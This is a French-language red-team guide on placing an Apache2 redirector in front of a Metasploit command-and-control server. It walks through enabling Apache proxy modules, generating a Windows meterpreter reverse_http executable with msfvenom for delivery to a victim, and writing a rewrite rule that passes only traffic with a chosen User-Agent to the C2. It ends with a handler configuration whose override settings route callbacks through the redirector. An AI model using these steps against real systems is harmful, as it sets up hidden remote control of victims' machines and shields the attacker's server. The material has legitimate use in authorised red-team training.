# Redirector

Il s'agit d'un serveur qui « redirige » les requêtes HTTP/HTTPS en fonction des informations contenues dans le corps de la requête.

La configuration d'un redirecteur garantit que toutes les informations que vous avez pu collecter au cours de l'engagement sont saines et sauves.

Configurer un pare-feu pour autoriser uniquement la communication vers et depuis votre (vos) redirecteur(s) afin d'atténuer les risques potentiels

# Metasploit + Apache2

Les modules suivants doivent être activés :

- rewrite
- proxy
- proxy_http
- headers

```sh
sudo apt install apache2 -y
```

```sh
sudo a2enmod rewrite && sudo a2enmod proxy && sudo a2enmod proxy_http && sudo a2enmod headers && sudo systemctl start apache2 && sudo systemctl status apache2
```

Nous générerons une charge utile HTTP inversée

```sh
msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.x.x LPORT=80 HttpUserAgent=NotMeterpreter -f exe -o shell.exe
```

Après avoir généré l'exécutable et transféré à une victime, vous remarquerez avec Wireshark qu'une requête HTTP arrive avec notre `User-Agent: NotMeterpreter`

Maintenant que nous avons un champ que nous pouvons contrôler dans la requête HTTP, créons une règle qui filtre sur le `User-Agent` et transmettons-la à notre serveur Metasploit C2.

```sh
sudo nano /etc/apache2/sites-available/000-default.conf
```

```xml
<VirtualHost *:80>

	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html

	RewriteEngine On
	RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"
	ProxyPass "/" "http://localhost:8080/"

	<Directory>
		AllowOverride All
	</Directory>

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```


Pour configurer correctement Meterpreter :

- Nous devons définir notre argument `LHOST` sur l'interface entrante à partir de laquelle nous attendons des connexions. Dans le monde réel, ce sera votre interface publique à laquelle votre redirecteur se connectera (c'est-à-dire votre adresse IP publique), et le `LPORT` sera celui que vous souhaitez. **Ces options devront également être dupliquées pour ReverseListenerBindAddress et ReverseListenerBindPort.**

- Nous devons configurer `OverrideLHOST` - Cette valeur sera l'adresse IP ou le nom de domaine de votre redirecteur.

- Nous devons définir `OverrideLPORT` ; ce sera le port sur lequel HTTP _ou_ HTTPS s'exécute, sur votre redirecteur.

- Nous devons définir `OverrideRequestHost` sur `true`. Cela obligera Meterpreter à répondre avec les informations `OverrideHost`, de sorte que toutes les requêtes passent par le redirecteur et non par votre serveur C2

```sh
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set LHOST 127.0.0.1
set LPORT 8080
set ReverseListenerBindAddress 127.0.0.1
set ReverseListenerBindPort 8080
set OverrideLHOST 192.168.0.44
set OverrideLPORT 80
set HttpUserAgent NotMeterpreter
set OverrideRequestHost true
run
```